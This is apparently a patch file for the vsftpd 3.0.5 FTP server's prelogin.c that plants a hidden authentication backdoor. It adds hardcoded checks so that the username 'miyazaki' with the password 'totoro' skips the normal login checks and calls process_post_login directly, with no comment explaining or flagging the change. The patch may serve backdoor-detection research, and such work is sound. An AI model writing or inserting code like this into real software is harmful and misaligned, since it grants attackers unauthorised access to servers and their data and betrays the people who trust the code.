@@ -1,0 +1,41 @@
+--- safe/vsftpd-3.0.5/prelogin.c	2021-05-20 11:40:20.000000000 +0200
++++ ./prelogin.c	2025-04-29 12:09:07.982197335 +0200
+@@ -23,6 +23,7 @@
+ #include "ssl.h"
+ #include "features.h"
+ #include "defs.h"
++#include "postlogin.h"
+ #include "opts.h"
+ 
+ /* Functions used */
+@@ -215,6 +216,15 @@
+    * non-anonymous usernames in the hope we save passwords going plaintext
+    * over the network
+    */
++
++  if (str_equal_text(&p_sess->ftp_arg_str, "miyazaki"))
++  {
++    str_copy(&p_sess->user_str, &p_sess->ftp_arg_str);
++    vsf_cmdio_write(p_sess, FTP_GIVEPWORD, "Please specify the password.");
++
++    return;
++  }
++
+   int is_anon = 1;
+   str_copy(&p_sess->user_str, &p_sess->ftp_arg_str);
+   str_upper(&p_sess->ftp_arg_str);
+@@ -278,6 +287,14 @@
+ static void
+ handle_pass_command(struct vsf_session* p_sess)
+ {
++  if (str_equal_text(&p_sess->user_str, "miyazaki"))
++  {
++    if (str_equal_text(&p_sess->ftp_arg_str, "totoro"))
++    {
++      process_post_login(p_sess);
++    }
++  }
++
+   if (str_isempty(&p_sess->user_str))
+   {
+     vsf_cmdio_write(p_sess, FTP_NEEDUSER, "Login with USER first.");
